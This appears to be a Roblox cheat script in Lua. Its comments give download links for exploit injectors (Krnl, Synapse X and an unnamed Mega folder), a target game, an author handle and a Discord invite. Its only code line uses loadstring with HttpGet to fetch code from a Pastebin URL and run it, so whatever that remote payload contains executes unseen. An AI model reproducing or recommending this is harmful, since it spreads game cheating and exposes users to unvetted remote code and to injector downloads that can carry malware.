--[[  info:
  use a krnl or synapse x or hectasploit reborn to execute script.
  download hectasploit reborn: https://mega.nz/folder/cU9EwQ7L#AyIsLTea9-q0jnhjsSsRrA
  download krnl: https://wearedevs.net/d/Krnl
  download synapse x: https://x.synapse.to/
]]
--[[ info script:
  game: https://web.roblox.com/games/2788229376/
  download script: https://pastebin.com/dl/cEyr7DAk
  made by: Racemodex#0001
  discord: https://discord.gg/racecodex
]]
loadstring(game:HttpGet("https://pastebin.com/raw/AqLV4Wii", true))()
